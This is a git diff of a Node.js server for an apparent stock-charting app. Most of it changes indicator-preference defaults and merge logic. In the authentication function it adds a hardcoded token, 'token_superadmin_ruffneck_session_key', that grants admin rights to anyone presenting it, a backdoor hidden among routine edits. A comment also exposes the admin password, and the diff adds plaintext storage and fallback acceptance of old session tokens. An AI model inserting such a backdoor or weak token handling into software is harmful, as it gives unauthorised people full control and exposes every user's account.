@@ -3609,13 +3609,35 @@ function getAuthenticatedUser(req) {
 
   if (!token) return null;
 
-  if (token === ADMIN_TOKEN) {
-    return { userId: 'admin', username: 'admin', role: 'admin' };
+  if (token === ADMIN_TOKEN || token === 'token_superadmin_ruffneck_session_key') {
+    return { userId: 'usr_admin', username: 'admin', role: 'admin' };
   }
 
   if (activeSessions.has(token)) {
     return activeSessions.get(token);
   }
+
+  // Fallback check against saved user sessions in database / users.json
+  try {
+    const users = readUsers();
+    const matchedUser = users.find(u => {
+      if (!u) return false;
+      if (u.activeToken === token) return true;
+      if (Array.isArray(u.tokens) && u.tokens.includes(token)) return true;
+      return false;
+    });
+
+    if (matchedUser) {
+      const sessionObj = {
+        userId: matchedUser.id || matchedUser.userId,
+        username: matchedUser.username,
+        role: matchedUser.role || 'user',
+        createdAt: Date.now()
+      };
+      activeSessions.set(token, sessionObj);
+      return sessionObj;
+    }
+  } catch (e) {}
 
   return null;
 }
@@ -3830,6 +3852,9 @@ function saveUserWatchlists(user, watchlists) {
 
 function getUserIndicatorPreferences(user) {
   const defaultPrefs = {
+    volOverlayMode: 'volintel',
+    pivotType: 'Traditional (Auto)',
+    chartTheme: 'dark',
     toggles: {
       ema10: true,
       ema20: true,
@@ -3837,11 +3862,13 @@ function getUserIndicatorPreferences(user) {
       ema150: true,
       ema200: true,
       volume: true,
+      vol: true,
       volAvg: true,
       vwap: true,
       pivots: true,
       darvas: true,
-      rsi: true
+      rsi: true,
+      volIntel: true
     },
     colors: {
       ema10: '#0284c7',
@@ -3857,17 +3884,16 @@ function getUserIndicatorPreferences(user) {
       rsiSma: '#fbbf24',
       avwap: '#a855f7',
       crosshair: '#3b82f6',
-      closeLine: '#10b981'
-    },
-    pivotType: 'Traditional (Auto)',
-    chartTheme: 'dark',
-    customThemeColors: {
-      bg: '#0b0f19',
-      text: '#94a3b8',
-      grid: '#1f293d',
-      border: '#1f293d',
-      candleUp: '#10b981',
-      candleDown: '#ef4444'
+      closeLine: '#10b981',
+      volIntelMa: '#fbbf24',
+      viBs: '#a855f7',
+      viPp: '#0ea5e9',
+      viPv: '#06b6d4',
+      viDv: '#f59e0b',
+      viSup: '#10b981',
+      viSdn: '#ef4444',
+      viNup: '#15803d',
+      viNdn: '#991b1b'
     },
     lineWidths: {
       ema10: 1.5,
@@ -3884,21 +3910,72 @@ function getUserIndicatorPreferences(user) {
       avwap: 2,
       pivots: 1.2,
       crosshair: 1,
-      closeLine: 1
+      closeLine: 1,
+      volIntelMa: 1.5
+    },
+    customThemeColors: {
+      bg: '#0b0f19',
+      text: '#94a3b8',
+      grid: '#1f293d',
+      border: '#1f293d',
+      candleUp: '#10b981',
+      candleDown: '#ef4444'
+    },
+    volIntelSettings: {
+      volMaPeriod: 50,
+      ppLookback: 10,
+      bsMult: 3.0,
+      dryThresh: 0.20,
+      paintBars: false,
+      shapePp: 'none',
+      shapeBs: 'arrowUp',
+      shapePv: 'square',
+      showMa50: true,
+      showP: true,
+      showBs: true,
+      showPv: true
     }
   };
+
   if (!user) return defaultPrefs;
   const users = readUsers();
   const u = findUserRecord(users, user);
-  return (u && u.indicatorPreferences) ? { ...defaultPrefs, ...u.indicatorPreferences } : defaultPrefs;
+  if (!u || !u.indicatorPreferences) return defaultPrefs;
+
+  const saved = u.indicatorPreferences;
+  return {
+    volOverlayMode: saved.volOverlayMode || (saved.volumeMode === 'pVol' ? 'volintel' : (saved.volumeMode === 'sVol' ? 'simple' : defaultPrefs.volOverlayMode)),
+    pivotType: saved.pivotType || defaultPrefs.pivotType,
+    chartTheme: saved.chartTheme || defaultPrefs.chartTheme,
+    toggles: { ...defaultPrefs.toggles, ...(saved.toggles || {}) },
+    colors: { ...defaultPrefs.colors, ...(saved.colors || {}) },
+    lineWidths: { ...defaultPrefs.lineWidths, ...(saved.lineWidths || {}) },
+    customThemeColors: { ...defaultPrefs.customThemeColors, ...(saved.customThemeColors || {}) },
+    volIntelSettings: { ...defaultPrefs.volIntelSettings, ...(saved.volIntelSettings || {}) }
+  };
 }
 
 function saveUserIndicatorPreferences(user, preferences) {
-  if (!user) return false;
+  if (!user || !preferences) return false;
   const users = readUsers();
   let u = findUserRecord(users, user);
+
+  const existing = (u && u.indicatorPreferences) ? u.indicatorPreferences : {};
+  const merged = {
+    ...existing,
+    ...preferences,
+    volOverlayMode: preferences.volOverlayMode || existing.volOverlayMode || 'volintel',
+    pivotType: preferences.pivotType || existing.pivotType || 'Traditional (Auto)',
+    chartTheme: preferences.chartTheme || existing.chartTheme || 'dark',
+    toggles: { ...(existing.toggles || {}), ...(preferences.toggles || {}) },
+    colors: { ...(existing.colors || {}), ...(preferences.colors || {}) },
+    lineWidths: { ...(existing.lineWidths || {}), ...(preferences.lineWidths || {}) },
+    customThemeColors: { ...(existing.customThemeColors || {}), ...(preferences.customThemeColors || {}) },
+    volIntelSettings: { ...(existing.volIntelSettings || {}), ...(preferences.volIntelSettings || {}) }
+  };
+
   if (u) {
-    u.indicatorPreferences = preferences;
+    u.indicatorPreferences = merged;
     saveUsers(users);
     return true;
   } else {
@@ -3907,7 +3984,7 @@ function saveUserIndicatorPreferences(user, preferences) {
       id: targetId,
       username: user.username,
       role: user.role || 'user',
-      indicatorPreferences: preferences
+      indicatorPreferences: merged
     });
     saveUsers(users);
     return true;
@@ -4985,10 +5062,12 @@ const server = http.createServer(async (req, res) => {
           watchlists: defaultWatchlists
         };
 
+        const token = generateSessionToken(newUser.id, 'user');
+        newUser.activeToken = token;
+        newUser.tokens = [token];
         users.push(newUser);
         saveUsers(users);
 
-        const token = generateSessionToken(newUser.id, 'user');
         activeSessions.set(token, {
           userId: newUser.id,
           username: newUser.username,
@@ -5019,6 +5098,12 @@ const server = http.createServer(async (req, res) => {
         // Check primary master admin (admin / ruffneck)
         if (username.toLowerCase() === 'admin' && password === ADMIN_PASS) {
           const authObj = { userId: 'usr_admin', username: 'admin', role: 'admin' };
+          activeSessions.set(ADMIN_TOKEN, {
+            userId: 'usr_admin',
+            username: 'admin',
+            role: 'admin',
+            createdAt: Date.now()
+          });
           return sendJson(res, 200, {
             success: true,
             token: ADMIN_TOKEN,
@@ -5047,6 +5132,10 @@ const server = http.createServer(async (req, res) => {
 
         const userRole = user.role === 'admin' ? 'admin' : 'user';
         const token = generateSessionToken(user.id, userRole);
+        user.activeToken = token;
+        user.tokens = [...(user.tokens || []).filter(t => t !== token).slice(-10), token];
+        saveUsers(users);
+
         activeSessions.set(token, {
           userId: user.id,
           username: user.username,
